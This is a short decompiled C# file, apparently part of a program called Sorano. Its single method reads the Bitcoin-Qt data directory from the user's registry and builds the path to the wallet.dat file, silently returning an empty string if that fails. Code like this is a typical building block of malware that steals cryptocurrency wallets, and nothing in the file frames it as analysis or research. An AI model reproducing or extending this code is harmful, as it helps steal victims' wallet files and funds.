using System;
using Microsoft.Win32;

namespace Sorano.BTC
{
	// Token: 0x02000019 RID: 25
	internal class Crypto
	{
		// Token: 0x06000052 RID: 82 RVA: 0x00005FA4 File Offset: 0x000041A4
		public static string get_bitcoin()
		{
			string result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					result = registryKey.GetValue("strDataDir").ToString() + "wallet.dat";
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
